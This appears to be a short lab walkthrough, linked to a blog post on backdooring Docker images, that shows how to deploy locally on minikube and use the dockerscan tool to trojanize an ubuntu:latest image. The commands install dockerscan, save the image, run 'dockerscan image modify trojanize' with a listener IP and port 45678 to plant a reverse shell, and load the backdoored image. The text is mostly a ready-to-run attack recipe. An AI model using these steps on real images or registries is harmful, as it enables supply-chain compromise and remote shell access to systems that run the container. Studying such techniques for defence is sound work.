# Trojanized Docker image with `dockerscan` tool

https://greencashew.dev/posts/backdooring-docker-images-reverse-shell/

## Minikube

The following show-cases how to deploy everything locally on minikube.

### Start minikube
```bash
minikube start
```

### Download and install DockerScan

Retrieve the IP address minikube is running on
```bash
$ #https://greencashew.dev/posts/backdooring-docker-images-reverse-shell/
sudo apt update
sudo apt install -y nmap
git clone https://github.com/cr0hn/dockerscan
cd dockerscan
sudo python3.6 setup.py install
mkdir backdoor && cd backdoor
docker pull ubuntu:latest
docker save ubuntu:latest -o ubuntu-orginal

export LC_ALL=C.UTF-8
export LANG=C.UTF-8

dockerscan image modify trojanize ubuntu-orginal <listener_ip> -p 45678 -o ubuntu-trojanized

docker load -i ubuntu-trojanized.tar
```
